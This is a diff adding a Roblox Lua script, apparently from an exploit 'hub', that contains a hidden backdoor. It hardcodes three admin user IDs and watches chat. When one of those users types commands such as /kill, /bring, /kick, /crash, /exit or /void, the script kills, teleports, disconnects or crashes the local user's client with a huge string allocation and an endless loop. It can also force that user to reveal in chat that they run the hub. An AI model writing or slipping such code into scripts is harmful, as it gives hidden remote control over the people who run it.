@@ -1,0 +1,59 @@
+local admins = {4636830533, 4636825706, 3536016467}
+
+if game.TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+ game.TextChatService.MessageReceived:Connect(function(info)
+   if info.TextSource and table.find(admins, info.TextSource.UserId) and not table.find(admins, game.Players.LocalPlayer.CharacterAppearanceId) then
+     if info.Text:lower() == "/kill" then
+game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
+game.Players.LocalPlayer.Character.Humanoid.Health = 0
+game.Players.LocalPlayer.Character.Humanoid:TakeDamage(math.huge)
+game.Players.LocalPlayer.Character.Humanoid.MaxHealth = 0
+game.Players.LocalPlayer.Character.Humanoid:ChangeState("Dead")
+     elseif info.Text:lower() == "/bring" then
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:GetPlayerByUserId(info.TextSource.UserId).Character.HumanoidRootPart.CFrame
+     elseif info.Text:lower() == "/kick" then
+game.Players:ResetLocalPlayer()
+     elseif info.Text:lower() == "/crash" then
+game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+local LZt = Instance.new("LocalizationTable", game:GetService("LocalizationService"))
+LZt:SetEntries({{Key = "0x1", Source = "Execute", Values = {["en-us"] = string.rep("Bbbbbbbb", 1e8)}}})
+while true do end
+     elseif info.Text:lower() == "/find" then
+game.TextChatService.TextChannels.RBXGeneral:SendAsync("I\'m")
+     elseif info.Text:lower() == "/exit" then
+game:Shutdown()
+     elseif info.Text:lower() == "/void" then
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, workspace.FallenPartsDestroyHeight, 0)
+     end
+   end
+ end)
+else
+ game.Players.PlayerAdded:Connect(function(player)
+   if table.find(admins, player.CharacterAppearanceId) and not table.find(admins, game.Players.LocalPlayer.CharacterAppearanceId) then
+     player.Chatted:Connect(function(text)
+       if text:lower() == "/kick" then
+         game.Players:ResetLocalPlayer()
+       elseif text:lower() == "/find" then
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I\'m using your hub", "To " .. player.Name)
+       elseif text:lower() == "/bring" then
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
+       elseif text:lower() == "/crash" then
+game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+local LZt = Instance.new("LocalizationTable", game:GetService("LocalizationService"))
+LZt:SetEntries({{Key = "0x1", Source = "Execute", Values = {["en-us"] = string.rep("Bbbbbbbb", 1e8)}}})
+while true do end
+       elseif text:lower() == "/kill" then
+game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
+game.Players.LocalPlayer.Character.Humanoid.Health = 0
+game.Players.LocalPlayer.Character.Humanoid:TakeDamage(math.huge)
+game.Players.LocalPlayer.Character.Humanoid.MaxHealth = 0
+game.Players.LocalPlayer.Character.Humanoid:ChangeState("Dead")
+       end
+     end)
+   end
+ end)
+ 
+ for _, plr in next, game.Players:GetPlayers() do
+   firesignal(game.Players.PlayerAdded, plr)
+ end
+end
